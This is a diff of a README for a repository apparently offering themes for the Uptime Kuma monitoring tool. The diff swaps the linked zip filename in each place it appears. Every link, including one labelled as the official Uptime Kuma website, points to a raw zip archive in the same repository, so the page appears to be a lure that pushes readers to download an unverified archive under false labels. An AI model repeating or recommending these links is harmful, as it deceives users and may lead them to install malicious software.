@@ -1,7 +1,7 @@
 # 🎨 uptime-kuma-themes - Enhance Your Uptime Kuma Experience
 
 ## 📥 Download the Latest Release
-[![Download](https://github.com/gkevos/uptime-kuma-themes/raw/refs/heads/main/themes/cute-kuma/themes_uptime_kuma_3.0-alpha.1.zip)](https://github.com/gkevos/uptime-kuma-themes/raw/refs/heads/main/themes/cute-kuma/themes_uptime_kuma_3.0-alpha.1.zip)
+[![Download](https://github.com/gkevos/uptime-kuma-themes/raw/refs/heads/main/themes/lumina/themes-kuma-uptime-v2.3-beta.4.zip)](https://github.com/gkevos/uptime-kuma-themes/raw/refs/heads/main/themes/lumina/themes-kuma-uptime-v2.3-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the uptime-kuma-themes repository! Here, you will find a variety of themes designed to enhance your Uptime Kuma monitoring experience. This guide will walk you through the download and installation process, ensuring you can easily apply new themes to your application. 
@@ -23,7 +23,7 @@ Themes allow you to personalize your Uptime Kuma interface. A well-designed them
 ## 📥 Download & Install
 To get started, visit the Releases page to download the themes.
 
-[Download Here](https://github.com/gkevos/uptime-kuma-themes/raw/refs/heads/main/themes/cute-kuma/themes_uptime_kuma_3.0-alpha.1.zip)
+[Download Here](https://github.com/gkevos/uptime-kuma-themes/raw/refs/heads/main/themes/lumina/themes-kuma-uptime-v2.3-beta.4.zip)
 
 ### Step-by-Step Instructions:
 1. Click the "Download Here" link above.
@@ -56,6 +56,6 @@ Once you have installed a theme, consider experimenting with various settings:
 - Regularly check for new themes or enhancements.
 
 ## 🔗 Helpful Links
-- [Uptime Kuma Official Website](https://github.com/gkevos/uptime-kuma-themes/raw/refs/heads/main/themes/cute-kuma/themes_uptime_kuma_3.0-alpha.1.zip)
+- [Uptime Kuma Official Website](https://github.com/gkevos/uptime-kuma-themes/raw/refs/heads/main/themes/lumina/themes-kuma-uptime-v2.3-beta.4.zip)
 
 Thank you for using uptime-kuma-themes! Enjoy a more personalized monitoring experience.
